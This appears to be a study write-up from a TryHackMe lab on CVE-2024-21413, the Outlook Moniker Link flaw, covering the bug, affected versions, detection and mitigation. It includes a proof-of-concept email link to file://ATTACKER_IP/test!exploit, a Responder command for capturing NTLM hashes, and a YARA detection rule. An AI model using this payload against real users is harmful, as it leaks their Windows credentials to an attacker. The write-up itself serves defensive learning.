# 📧 CVE-2024-21413 - Microsoft Outlook Moniker Link Vulnerability

## 🗓️ Disclosure

- **Date**: February 13, 2024  
- **CVE**: [CVE-2024-21413](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413)  
- **Discovered By**: Haifei Li (Check Point Research)

## 🚨 Summary

A critical vulnerability in Microsoft Outlook allows attackers to exploit **Moniker Links**, leading to **NTLM credential leakage** and potentially **Remote Code Execution (RCE)**. This bypasses Outlook’s Protected View and security prompts.

---

## 🔍 What is a Moniker Link?

Moniker Links are not traditional URLs like `http://`. They use Microsoft’s **Component Object Model (COM)** and can:

- Access local files or remote network shares
- Bind to and execute COM objects
- Trigger high-privilege actions

Outlook fails to properly handle these links, which can result in:

- Automatic NTLM authentication to attacker-controlled SMB servers
- Leakage of Windows **netNTLMv2** hashes
- Potential RCE using COM-based payloads

---

## 📊 Vulnerability Overview

| Field                  | Detail                                                              |
|------------------------|---------------------------------------------------------------------|
| CVE                    | [CVE-2024-21413](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413) |
| Impact                 | Remote Code Execution, Credential Theft                            |
| Severity               | Critical (CVSS 9.8)                                                 |
| Attack Complexity      | Low                                                                 |
| Discovered By          | Haifei Li, Check Point Research                                     |

---

## 🖥️ Affected Software Versions

| Microsoft Office Version         | Affected From Version              |
|----------------------------------|------------------------------------|
| Microsoft Office LTSC 2021       | 19.0.0                             |
| Microsoft 365 Apps for Enterprise| 16.0.1                             |
| Microsoft Office 2019            | 16.0.1                             |
| Microsoft Office 2016            | < 16.0.5435.1001                   |

---

## ⚙️ Technical Context

### COM & Moniker Links

- COM: Microsoft's Component Object Model used for object interaction.
- Monikers: COM-based “intelligent names” that bind to objects or files.
- `file://` links in HTML emails can invoke these Monikers.

### Bypass Technique

- A Moniker Link like:

  ```html
  <a href="file://ATTACKER_IP/test!exploit">Click me</a>
  ```

  uses a special character (`!`) to bypass Protected View, forcing Outlook to initiate an SMB connection to the attacker’s server—sending NTLM hashes.

---

## 🧪 Proof-of-Concept (PoC)

### Email Exploit Script

A Python PoC sends an HTML email with a crafted Moniker Link:

```python
html_content = '''
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_IP/test!exploit">Click me</a></p>
</html>
'''
```

### Responder SMB Listener

```bash
responder -I ens5
```

### Outcome

- Victim opens Outlook
- Clicks the "Click me" link
- Responder captures the **netNTLMv2** hash from the SMB authentication attempt

---

## 🔎 Detection

### 🧪 YARA Rule (by [Florian Roth](https://github.com/CMNatic/CVE-2024-21413))

```yara
rule EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24 {
    meta:
        description = "Detects CVE-2024-21413 exploitation attempts"
        author = "X__Junior, Florian Roth"
        reference = "https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/"
        date = "2024-02-17"
        modified = "2024-02-19"
        score = 75

    strings:
        $a1 = "Subject: "
        $a2 = "Received: "
        $xr1 = /file:\/\/\/\\[^"']{6,600}\.(docx|txt|pdf|...)!/

    condition:
        filesize < 1000KB
        and all of ($a*)
        and 1 of ($xr*)
}
```

### Wireshark

- SMB request and **netNTLMv2 hash** can be captured in packet traces.

---

## 🛡️ Mitigation & Remediation

- ✅ **Update Microsoft Outlook** immediately via Windows Update or Microsoft Update Catalog
- 🚫 **No configuration workaround** exists to disable Moniker handling in Outlook
- 🔐 Consider disabling automatic NTLM authentication where feasible
- 🔥 Blocking outbound SMB (port 445) on firewalls can help mitigate credential theft

---

## 🔐 Security Best Practices

- Do **not click** unknown or suspicious links
- **Preview** links before clicking
- **Forward** suspicious emails to your IT or cybersecurity team
- Monitor systems for signs of unusual SMB or NTLM traffic

---

## 🧾 Key Terms

| Term        | Definition                                       |
|-------------|--------------------------------------------------|
| **COM**     | Component Object Model — Windows object system   |
| **Moniker** | A COM-based reference to link or bind to objects |
| **NTLM**    | Windows authentication protocol                  |
| **RCE**     | Remote Code Execution                            |

---

## 🧠 Trivia & Questions

- 🔧 **Tool used to capture hashes**: `responder`
- 🔑 **Hash type captured**: `netNTLMv2`

> ---

<sub>🔗 References & Resources:</sub>
- <sub>TryHackMe — Moniker Link | Cyber Security 101 (THM) [TryHackMe](https://tryhackme.com/room/monikerlink)</sub>
- <sub>Wanna read more about [Moniker Link](https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-and-the-big-picture/) and Microsoft's article on [Moniker Links](https://learn.microsoft.com/en-us/windows/win32/com/url-monikers)</sub>
- <sub>Access [CVE Records](https://www.cve.org/CVERecord?id=CVE-2024-21413)</sub>

